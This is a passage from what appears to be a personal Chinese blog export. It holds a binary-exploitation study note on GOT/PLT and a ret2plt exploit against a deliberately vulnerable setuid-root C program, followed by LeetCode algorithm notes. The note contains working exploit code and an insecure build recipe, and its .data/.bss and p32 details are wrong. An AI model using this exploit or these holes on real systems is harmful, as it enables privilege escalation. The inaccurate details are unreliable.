<h4 id="2-1-1-Linux内存布局"><a href="#2-1-1-Linux内存布局" class="headerlink" title="2.1.1 Linux内存布局"></a>2.1.1 Linux内存布局</h4><p><img src="https://pic.imgdb.cn/item/65fc5d309f345e8d03706c09.png"></p>
<ul>
<li>.text 汇编代码</li>
<li>.data 无初始值的数据（静态变量，全局变量）</li>
<li>.bss 有初始值的数据 （静态变量，全局变量）</li>
<li>heap 堆</li>
<li>shared object 共享对象区域（动态库所在）</li>
<li>stack 栈</li>
<li>kernel-area 内核区域</li>
</ul>
<h5 id="2-1-2-静态函数库与动态函数库"><a href="#2-1-2-静态函数库与动态函数库" class="headerlink" title="2.1.2 静态函数库与动态函数库"></a>2.1.2 静态函数库与动态函数库</h5><p>静态函数库 —— 在程序运行前就已经被加载到目标程序里了</p>
<p>动态函数库 —— 在程序启动的时候被加载</p>
<p>不同于静态库的是，<strong>共享库的text段在多个进程间共享</strong>，<strong>但它的数据段在每个进程中是唯一的</strong>。这样设计可以减少内存和磁盘空间。正是text段在多个进程间共享，其必须只有读和执行权限。没有了写权限，动态链接器不能在text段内部重定位数据描述符(data symbol)或者函数地址。这样一来，程序运行期间，动态链接器是如何在不修改text段的情况下，重定位共享库描述符的呢? 利用PIC! [4] </p>
<p><font color=red><strong>这句话非常重要！</strong></font></p>
<h5 id="2-1-3-PIC（位置独立代码）"><a href="#2-1-3-PIC（位置独立代码）" class="headerlink" title="2.1.3 PIC（位置独立代码）"></a>2.1.3 PIC（位置独立代码）</h5><p>位置无关代码是指代码无论被加载到哪个地址上都可以正常执行。gcc选项中添加-fPIC会产生相关代码。</p>
<p>共享库的text段会指向数据段中的一个特定表，这个表用来存放全局描述符和函数的绝对虚拟地址。动态链接器作为重定位的一部分会填充这个表。因此，在重定位时，只有数据段被修改，而text段依然完好无顺。</p>
<p><strong>简言之，既然我们想让共享函数库被多个进程共享，就要让它的.text段中的数据描述符和函数地址能被重定位。可是由于.text无法被写，我们只能通过PIC来间接寻址完成！</strong></p>
<h3 id="2-2-GOT（全局偏移表）-PLT（过程链接表）"><a href="#2-2-GOT（全局偏移表）-PLT（过程链接表）" class="headerlink" title="2.2 GOT（全局偏移表）&amp; PLT（过程链接表）"></a>2.2 GOT（全局偏移表）&amp; PLT（过程链接表）</h3><h4 id="2-2-1-GOT"><a href="#2-2-1-GOT" class="headerlink" title="2.2.1 GOT"></a>2.2.1 GOT</h4><p>全局偏移表为每个全局变量分配一个4字节的表项，这4个字表项中含有全局变量的地址。当代码段中的一条指令引用一个全局变量时，这条指令指向的是GOT中的一个表项，而不是全局变量的绝对虚拟地址。当共享库被加载时，动态链接库会重定位这个GOT表项。因此，PIC利用GOT通过一层间接寻址来重定位全局描述符。</p>
<h4 id="2-2-1-PLT"><a href="#2-2-1-PLT" class="headerlink" title="2.2.1 PLT"></a>2.2.1 PLT</h4><p>过程链接表含有每个全局函数的存根代码。text段中的一条call指令不会直接调用这个函数(‘function’)，而是调用这个存根代码(function@PLT)。<strong>存根代码在动态链接器的帮助下，解析函数地址</strong>并将其拷贝到GOT(GOT[n])中。**解析过程只发生在第一次调用函数(‘function’)的时候，之后代码段中的call指令调用存根代码(function@PLT)而不是调用动态链接器去解析函数地址(‘function’)**。存根代码直接从GOT(GOT[n])获取函数地址并跳转到那里。因此，PIC利用PLT通过两层间接寻址来重定位函数地址。</p>
<p>简言之：</p>
<ul>
<li>第一次调用function时，动态链接器会解析function的地址，并拷贝到GOT(GOT(n))中</li>
<li>以后再次调用function时，只会调用存根代码(function@PLT)，而不会再次解析function的地址</li>
<li>存根代码会从GOT(GOT[n])里获取地址并跳转</li>
</ul>
<p><strong>两层间接寻址：function@PLT -&gt; GOT(GOT(n)) -&gt; function addr</strong></p>
<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><h3 id="3-1-漏洞代码"><a href="#3-1-漏洞代码" class="headerlink" title="3.1 漏洞代码"></a>3.1 漏洞代码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span> </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">()</span> &#123;      <span class="comment">//这个函数在啊程序中并没有直接执行，但是为了后续的寻找plt进行漏洞利用，需要编译它</span></span><br><span class="line"></span><br><span class="line"> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line"> <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line"> <span class="type">char</span> buf[<span class="number">256</span>];</span><br><span class="line"> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="3-2-编译"><a href="#3-2-编译" class="headerlink" title="3.2 编译"></a>3.2 编译</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">echo</span> 2 &gt; /proc/sys/kernel/randomize_va_space</span> </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">gcc -g -fno-stack-protector -o vuln vuln.c</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">sudo <span class="built_in">chown</span> root vuln</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">sudo <span class="built_in">chgrp</span> root vuln</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">sudo <span class="built_in">chmod</span> +s vuln</span></span><br></pre></td></tr></table></figure>



<h3 id="3-3-调试"><a href="#3-3-调试" class="headerlink" title="3.3 调试"></a>3.3 调试</h3><p>查看main函数的汇编</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">gdb-peda$ </span><span class="language-bash">disassemble main</span></span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x000000000000118b &lt;+0&gt;:     push   rbp</span><br><span class="line">   0x000000000000118c &lt;+1&gt;:     mov    rbp,rsp</span><br><span class="line">   0x000000000000118f &lt;+4&gt;:     sub    rsp,0x120</span><br><span class="line">   0x0000000000001196 &lt;+11&gt;:    mov    DWORD PTR [rbp-0x114],edi</span><br><span class="line">   0x000000000000119c &lt;+17&gt;:    mov    QWORD PTR [rbp-0x120],rsi</span><br><span class="line">   0x00000000000011a3 &lt;+24&gt;:    mov    DWORD PTR [rbp-0x4],0x0</span><br><span class="line">   0x00000000000011aa &lt;+31&gt;:    mov    rax,QWORD PTR [rbp-0x120]</span><br><span class="line">   0x00000000000011b1 &lt;+38&gt;:    add    rax,0x8</span><br><span class="line">   0x00000000000011b5 &lt;+42&gt;:    mov    rdx,QWORD PTR [rax]</span><br><span class="line">   0x00000000000011b8 &lt;+45&gt;:    lea    rax,[rbp-0x110]</span><br><span class="line">   0x00000000000011bf &lt;+52&gt;:    mov    rsi,rdx</span><br><span class="line">   0x00000000000011c2 &lt;+55&gt;:    mov    rdi,rax</span><br><span class="line">   0x00000000000011c5 &lt;+58&gt;:    call   0x1030 &lt;strcpy@plt&gt;</span><br><span class="line">   0x00000000000011ca &lt;+63&gt;:    lea    rax,[rbp-0x110]</span><br><span class="line">   0x00000000000011d1 &lt;+70&gt;:    mov    rdi,rax</span><br><span class="line">   0x00000000000011d4 &lt;+73&gt;:    call   0x1040 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000000011d9 &lt;+78&gt;:    mov    eax,0x0</span><br><span class="line">   0x00000000000011de &lt;+83&gt;:    leave  </span><br><span class="line">   0x00000000000011df &lt;+84&gt;:    ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>查看shell函数的汇编</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">gdb-peda$ </span><span class="language-bash">disassemble shell</span></span><br><span class="line">Dump of assembler code for function shell:</span><br><span class="line">   0x0000000000001169 &lt;+0&gt;:     push   rbp</span><br><span class="line">   0x000000000000116a &lt;+1&gt;:     mov    rbp,rsp</span><br><span class="line">   0x000000000000116d &lt;+4&gt;:     lea    rax,[rip+0xe90]        # 0x2004</span><br><span class="line">   0x0000000000001174 &lt;+11&gt;:    mov    rdi,rax</span><br><span class="line">   0x0000000000001177 &lt;+14&gt;:    mov    eax,0x0</span><br><span class="line">   0x000000000000117c &lt;+19&gt;:    call   0x1050 &lt;system@plt&gt;</span><br><span class="line">   0x0000000000001181 &lt;+24&gt;:    mov    edi,0x0</span><br><span class="line">   0x0000000000001186 &lt;+29&gt;:    call   0x1060 &lt;exit@plt&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>找到’&#x2F;bin&#x2F;sh’的地址</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">gdb-peda$ </span><span class="language-bash">find <span class="string">&#x27;/bin/sh&#x27;</span></span></span><br><span class="line">Searching for &#x27;/bin/sh&#x27; in: None ranges</span><br><span class="line">Found 3 results, display max 3 items:</span><br><span class="line">     vuln : 0x564f073e3004 --&gt; 0x68732f6e69622f (&#x27;/bin/sh&#x27;)</span><br><span class="line">     vuln : 0x564f073e4004 --&gt; 0x68732f6e69622f (&#x27;/bin/sh&#x27;)</span><br><span class="line">libc.so.6 : 0x7fe9a4c99117 --&gt; 0x68732f6e69622f (&#x27;/bin/sh&#x27;)</span><br></pre></td></tr></table></figure>



<h3 id="3-4-EXP"><a href="#3-4-EXP" class="headerlink" title="3.4 EXP"></a>3.4 EXP</h3><p>exp的构造，首先向缓冲区中填充256个字节的‘A’ + 向对齐空间中填充16字节的‘A’ + system@PLT的地址 + exit@PLT的地址 + system_arg的地址。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">system = <span class="number">0x1050</span></span><br><span class="line">exit = <span class="number">0x1060</span></span><br><span class="line">system_arg = <span class="number">0x559e0dd67004</span></span><br><span class="line">payload=<span class="string">&quot;A&quot;</span> * <span class="number">272</span>+p32(system)+p32(exit)+p32(system_arg)</span><br><span class="line"><span class="built_in">print</span> payload</span><br><span class="line">io= process(argv=[<span class="string">&#x27;./vuln&#x27;</span>, payload])</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p>[1] <a href="https://gxkyrftx.github.io/2019/03/02/%E7%BB%95%E8%BF%87ASLR-%E4%B8%80/">绕过ASLR-一</a></p>
<p>[2] <a href="https://lantern.cool/note-pwn-linux-protect/index.html">Linux常用保护机制</a></p>
<p>[3] <a href="https://darkwing.moe/2019/02/21/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02-%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80/">Pwn学习笔记2-内存布局</a></p>
<p>[4] <a href="https://diting0x.github.io/20170101/bypassaslr-returntoplt/">bypassaslr-returntoplt</a></p>
]]></content>
      <categories>
        <category>二进制学习笔记</category>
      </categories>
      <tags>
        <tag>二进制学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode笔记6 - 动态规划解题模板</title>
    <url>/2024/03/20/leetcode-dp/</url>
    <content><![CDATA[<h1 id="Leetcode笔记6-动态规划"><a href="#Leetcode笔记6-动态规划" class="headerlink" title="Leetcode笔记6 - 动态规划"></a>Leetcode笔记6 - 动态规划</h1><p><strong>核心思路</strong></p>
<ul>
<li>确定状态，即问题的变量</li>
<li>确定dp方程</li>
<li>采用自底向上 &#x2F; 自顶向下的解法</li>
</ul>
<p><strong>自底向上</strong></p>
<ul>
<li>从dp(0)开始举几个例子即可</li>
<li>确定好base case，假设base case确定到dp(n)，那么for循环的变量一定要从n+1的情况开始</li>
<li>例：for循环的变量从2开始，那么一定要确定的base case是dp(0), dp(1)</li>
</ul>
<h2 id="322-零钱兑换"><a href="#322-零钱兑换" class="headerlink" title="322. 零钱兑换"></a><a href="https://leetcode.cn/problems/coin-change/">322. 零钱兑换</a></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">coinChange</span>(<span class="params">self, coins: <span class="type">List</span>[<span class="built_in">int</span>], amount: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="comment">## dp(n) = min&#123;d(n-coin)&#125; + 1, coin=1,2,5, n &gt; 0</span></span><br><span class="line">        <span class="comment">## dp(0) == 0</span></span><br><span class="line">        <span class="comment">## dp(1) == min&#123;dp(1-1), dp(1-2), dp(1-5)&#125; + 1 == dp(1-1) + 1 == 1</span></span><br><span class="line">        <span class="comment">## dp(2) == min&#123;dp(2-1), dp(2-2), dp(2-5)&#125; + 1 == dp(2-2) + 1 == 1</span></span><br><span class="line">        <span class="comment">## dp(3) == min&#123;dp(3-1), dp(3-2), dp(3-5)&#125; + 1 == dp(2) + 1 == 2</span></span><br><span class="line">        <span class="comment">## dp(4) == min&#123;dp(4-1), dp(4-2), dp(4-5)&#125; + 1 == dp(2) + 1 == 2</span></span><br><span class="line">        dp = [<span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)] * (amount + <span class="number">1</span>)</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> coin <span class="keyword">in</span> coins:</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(coin, amount + <span class="number">1</span>):</span><br><span class="line">                dp[x] = <span class="built_in">min</span>(dp[x], dp[x - coin] + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> dp[amount] <span class="keyword">if</span> dp[amount] != <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>) <span class="keyword">else</span> -<span class="number">1</span></span><br></pre></td></tr></table></figure>



<h2 id="22-括号生成"><a href="#22-括号生成" class="headerlink" title="22. 括号生成"></a><a href="https://leetcode.cn/problems/generate-parentheses/">22. 括号生成</a></h2><p>这题可以用dp解纯粹是因为发现了一个规律，即：对于n组’()’，在’()’的不同位置，添加任意’()’，即可得到n+1的解。又即，dp(n)依赖于dp(n-1)。</p>
<p>同样的，又因为我们可以记录()的路径，我们同样可以用回溯法来解，见回溯解法。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 数字 n 代表生成括号的对数，请你设计一个函数，用于能够生成所有可能的并且 有效的 括号组合。</span></span><br><span class="line"><span class="comment"># 示例 1：</span></span><br><span class="line"><span class="comment"># 输入：n = 3</span></span><br><span class="line"><span class="comment"># 输出：[&quot;((()))&quot;,&quot;(()())&quot;,&quot;(())()&quot;,&quot;()(())&quot;,&quot;()()()&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例 2：</span></span><br><span class="line"><span class="comment"># 输入：n = 1</span></span><br><span class="line"><span class="comment"># 输出：[&quot;()&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generateParenthesis</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">str</span>]: <span class="comment">## 注意，函数返回的是List</span></span><br><span class="line">        <span class="comment">## </span></span><br><span class="line">        <span class="comment">## dp[0] = 0 </span></span><br><span class="line">        <span class="comment">## dp[1] = 1  &quot;()&quot;</span></span><br><span class="line">        <span class="comment">## dp[2] = dp[1] + 2 - 1 = 2 &quot;(()), ()()&quot;</span></span><br><span class="line">        <span class="comment">## dp[3] = dp[2] + 4 - 1 = 5   &quot;((()))  (()()) (())() &quot; + &quot;()(()) ()()()&quot;</span></span><br><span class="line">        <span class="comment">## dp[n] = dp[n-1] + 2n - 1</span></span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">1</span>: <span class="keyword">return</span> [<span class="string">&quot;()&quot;</span>]</span><br><span class="line">        res = <span class="built_in">set</span>()</span><br><span class="line">        <span class="keyword">for</span> pre_str <span class="keyword">in</span> self.generateParenthesis(n-<span class="number">1</span>): <span class="comment">## 要求dp(n)，就要用到dp(n-1)</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(pre_str) + <span class="number">1</span>):</span><br><span class="line">                res.add(pre_str[:j] + <span class="string">&quot;()&quot;</span> + pre_str[j:])</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">list</span>(res)</span><br></pre></td></tr></table></figure>



<h2 id="121-买卖股票的最佳时机"><a href="#121-买卖股票的最佳时机" class="headerlink" title="121. 买卖股票的最佳时机"></a><a href="https://leetcode.cn/problems/best-time-to-buy-and-sell-stock/">121. 买卖股票的最佳时机</a></h2><p>发现规律：<strong>前n天的最大收益 &#x3D; max(前n-1天的最大收益，第n天的收益 - 前n-1天的最小值)</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输入：[7,1,5,3,6,4]</span></span><br><span class="line"><span class="comment"># 输出：5</span></span><br><span class="line"><span class="comment"># 解释：在第 2 天（股票价格 = 1）的时候买入，在第 5 天（股票价格 = 6）的时候卖出，最大利润 = 6-1 = 5 。</span></span><br><span class="line"><span class="comment"># 返回你可以从这笔交易中获取的最大利润。如果你不能获取任何利润，返回 0 </span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="comment"># dp[n]: 前n天的最大收益</span></span><br><span class="line">    <span class="comment"># dp[1] = 0</span></span><br><span class="line">    <span class="comment"># dp[2] = max(dp[1], prices[1]-prices[0])</span></span><br><span class="line">    <span class="comment"># dp[3] = max(dp[2], prices[2]-min(prices[0], prices[1]))</span></span><br><span class="line">    <span class="comment"># dp[n] = max(dp[n-1], prices[n-1]-min(prices[0], prices[1], ... , prices[n-2]))</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">maxProfit</span>(<span class="params">self, prices: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        size = <span class="built_in">len</span>(prices)</span><br><span class="line">        <span class="keyword">if</span> size == <span class="number">1</span>: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        dp = [<span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)]* size</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">        min_val = prices[<span class="number">0</span>]</span><br><span class="line">        max_profit = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, size):</span><br><span class="line">            min_val = <span class="built_in">min</span>(prices[i-<span class="number">1</span>], min_val)</span><br><span class="line">            dp[i] = <span class="built_in">max</span>(dp[i-<span class="number">1</span>], prices[i]-min_val)</span><br><span class="line">            max_profit = <span class="built_in">max</span>(max_profit, dp[i])</span><br><span class="line">        <span class="keyword">return</span> max_profit</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这题还有一个更简单的方法，就是我们考虑遍历数组的时候，一定要考虑，<strong>有什么值是我们能维护的</strong>。</p>
<p>比如这题中，我们<strong>每遍历一天的价格</strong>，都<strong>可以维护两个值</strong>：<strong>历史最低值</strong>min_val &#x3D; min(min_val, prices[n])，<strong>最大利润值</strong>max_val&#x3D;max(max_val, price - min_val)。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">maxProfit</span>(<span class="params">self, prices: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        min_val = <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)</span><br><span class="line">        max_profit = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> price <span class="keyword">in</span> prices:</span><br><span class="line">            max_profit = <span class="built_in">max</span>(max_profit, price - min_val)</span><br><span class="line">            min_val = <span class="built_in">min</span>(min_val, price)</span><br><span class="line">        <span class="keyword">return</span> max_profit</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Leetcode算法笔记</category>
      </categories>
      <tags>
        <tag>Leetcode算法笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode笔记5 - BFS解题模板</title>
    <url>/2024/03/20/leetcode-bfs/</url>
    <content><![CDATA[<h1 id="Leetcode笔记5-BFS"><a href="#Leetcode笔记5-BFS" class="headerlink" title="Leetcode笔记5 - BFS"></a>Leetcode笔记5 - BFS</h1><p><strong>核心思路</strong></p>
<ul>
<li>维护一个队列，队列里存放的是同一行的所有节点。</li>
<li>通过while循环每次把队列里的结点全部读掉，并且每读（pop）一个，就要将该结点的左右子结点存放进去</li>
<li>循环直到队列为空</li>
</ul>
<h2 id="102-二叉树的层序遍历"><a href="#102-二叉树的层序遍历" class="headerlink" title="102. 二叉树的层序遍历"></a><a href="https://leetcode.cn/problems/binary-tree-level-order-traversal/">102. 二叉树的层序遍历</a></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">levelOrder</span>(<span class="params">self, root: <span class="type">Optional</span>[TreeNode]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        res = []</span><br><span class="line">        queue = [root]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> queue:</span><br><span class="line">            <span class="comment">## 通过队列长度来遍历掉当前层的所有结点</span></span><br><span class="line">            n = <span class="built_in">len</span>(queue)</span><br><span class="line">            level = []</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">	            node = queue.pop(<span class="number">0</span>)</span><br><span class="line">                level.append(node.val)</span><br><span class="line">                <span class="keyword">if</span> node.left: level.append(node.left)</span><br><span class="line">                <span class="keyword">if</span> node.right: level.append(node.right)</span><br><span class="line">            res.append(level)</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">            </span><br></pre></td></tr></table></figure>



<h2 id="199-二叉树的右视图"><a href="#199-二叉树的右视图" class="headerlink" title="199. 二叉树的右视图"></a><a href="https://leetcode.cn/problems/binary-tree-right-side-view/">199. 二叉树的右视图</a></h2><p>跟上面的唯一不同就是每层只取最右边的值作为结果返回</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">rightSideView</span>(<span class="params">self, root: <span class="type">Optional</span>[TreeNode]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        res = []</span><br><span class="line">        queue = [root]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> queue:</span><br><span class="line">            n = <span class="built_in">len</span>(queue)</span><br><span class="line">            level = []</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">                node = queue.pop(<span class="number">0</span>)</span><br><span class="line">                level.append(node.val)</span><br><span class="line">                <span class="keyword">if</span> node.left: queue.append(node.left)</span><br><span class="line">                <span class="keyword">if</span> node.right: queue.append(node.right)</span><br><span class="line">            res.append(level[-<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Leetcode算法笔记</category>
      </categories>
      <tags>
        <tag>Leetcode算法笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode笔记4 - 排序算法总结</title>
    <url>/2024/03/19/leetcode-sort/</url>
    <content><![CDATA[<h1 id="Leetcode笔记4-排序算法总结"><a href="#Leetcode笔记4-排序算法总结" class="headerlink" title="Leetcode笔记4 - 排序算法总结"></a>Leetcode笔记4 - 排序算法总结</h1><p>总结一把最可能面试面到的排序：<strong>快速排序</strong>和 <strong>归并排序</strong></p>
<h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><p><strong>核心思路</strong></p>
<ul>
<li>快速排序的思路是每次确定一个值，该值的左边都是比它小的，右边都是比它大的</li>
</ul>
<h3 id="215-数组中的第K个最大元素"><a href="#215-数组中的第K个最大元素" class="headerlink" title="215. 数组中的第K个最大元素"></a><a href="https://leetcode.cn/problems/kth-largest-element-in-an-array/">215. 数组中的第K个最大元素</a></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">## 快速排序的思路是每次确定一个值，该值的左边都是比它小的，右边都是比它大的</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">findKthLargest</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], k: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="comment"># 治：快慢指针，快指针用于遍历并与慢指针比较，慢指针用于被置换</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">partition</span>(<span class="params">nums, low, high</span>):</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">            nums[high], nums[mid] = nums[mid], nums[high]</span><br><span class="line">            i = low</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(low, high):</span><br><span class="line">                <span class="keyword">if</span> nums[j] &lt;= nums[high]:</span><br><span class="line">                    nums[i], nums[j] = nums[j], nums[i]</span><br><span class="line">                    i += <span class="number">1</span></span><br><span class="line">            nums[i], nums[high] = nums[high], nums[i]</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">quickSort</span>(<span class="params">nums, low, high</span>):</span><br><span class="line">            <span class="keyword">if</span> low &gt;= high:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            pi = partition(nums, low, high)</span><br><span class="line">            quickSort(nums, low, pi-<span class="number">1</span>)</span><br><span class="line">            quickSort(nums, pi+<span class="number">1</span>, high)</span><br><span class="line">        </span><br><span class="line">        quickSort(nums, <span class="number">0</span>, <span class="built_in">len</span>(nums)-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> nums[-k]</span><br></pre></td></tr></table></figure>



<h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2><p><strong>核心思路</strong></p>
<ul>
<li>分成左右两个<strong>有序数组</strong>，然后要将两个数组按顺序合并好（双指针合并）</li>
<li>涉及到数组边界不清晰的时候，<strong>最好用while循环遍历数组</strong>而不用nums[low:high]的形式</li>
</ul>
<h3 id="215-数组中的第K个最大元素-1"><a href="#215-数组中的第K个最大元素-1" class="headerlink" title="215. 数组中的第K个最大元素"></a><a href="https://leetcode.cn/problems/kth-largest-element-in-an-array/">215. 数组中的第K个最大元素</a></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">## 归并排序的思路是，分成左右两个有序数组，然后要将两个数组按顺序合并好</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">findKthLargest</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], k: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">nums, low, mid, high</span>): <span class="comment"># 职能是将两个有序数组按顺序合并好——双指针</span></span><br><span class="line">            i, j = low, mid+<span class="number">1</span></span><br><span class="line">            res = []</span><br><span class="line">            <span class="keyword">while</span> i &lt;= mid <span class="keyword">and</span> j &lt;= high:</span><br><span class="line">                <span class="keyword">if</span> nums[i] &lt; nums[j]: </span><br><span class="line">                    res.append(nums[i])</span><br><span class="line">                    i += <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>: </span><br><span class="line">                    res.append(nums[j])</span><br><span class="line">                    j += <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> i &lt;= mid:</span><br><span class="line">                res.append(nums[i])</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> j &lt;= high:</span><br><span class="line">                res.append(nums[j])</span><br><span class="line">                j += <span class="number">1</span></span><br><span class="line">            nums[low:high+<span class="number">1</span>] = res[:]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">sort</span>(<span class="params">nums, low, high</span>):</span><br><span class="line">            <span class="keyword">if</span> low &gt;= high:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            mid = (low + high) // <span class="number">2</span> 	<span class="comment"># 取1/2分成左右两个数组</span></span><br><span class="line">            sort(nums, low, mid)		<span class="comment"># 